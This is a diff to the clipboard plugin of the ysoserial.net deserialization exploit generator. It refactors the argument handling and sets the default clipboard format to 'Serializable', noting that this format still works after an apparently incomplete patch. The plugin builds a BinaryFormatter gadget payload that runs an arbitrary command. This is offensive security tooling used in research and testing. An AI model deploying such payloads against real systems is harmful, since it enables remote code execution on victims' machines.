@@ -7,6 +7,7 @@ using System.Runtime.Serialization;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Windows.Forms;
 using System.Threading;
+using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
@@ -24,7 +25,7 @@ namespace ysoserial.Plugins
 {
     class ClipboardPlugin : Plugin
     {
-        static string format = System.Windows.Forms.DataFormats.StringFormat;
+        static string format = System.Windows.Forms.DataFormats.Serializable;
         static string command = "";
         static bool test = false;
         static bool minify = false;
@@ -32,7 +33,7 @@ namespace ysoserial.Plugins
 
         static OptionSet options = new OptionSet()
             {
-                {"F|format=", "the object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: System.String", v => format = v },
+                {"F|format=", "the object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: Serializable (the only one that works in Feb 2020 as a result of an incomplete silent patch probably?)", v => format = v },
                 {"c|command=", "the command to be executed", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
@@ -67,10 +68,15 @@ namespace ysoserial.Plugins
             // here is a solution
             var staThread = new Thread(delegate ()
             {
+                InputArgs inputArgs = new InputArgs();
                 List<string> extra;
                 try
                 {
                     extra = options.Parse(args);
+                    inputArgs.CmdFullString = command;
+                    inputArgs.Minify = minify;
+                    inputArgs.UseSimpleType = useSimpleType;
+                    inputArgs.Test = test;
                 }
                 catch (OptionException e)
                 {
@@ -89,7 +95,7 @@ namespace ysoserial.Plugins
                     System.Environment.Exit(-1);
                 }
 
-                byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().Generate(command, "BinaryFormatter", false, minify, useSimpleType);
+                byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
                 MemoryStream ms = new MemoryStream(serializedData);
                 DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(ms);
 
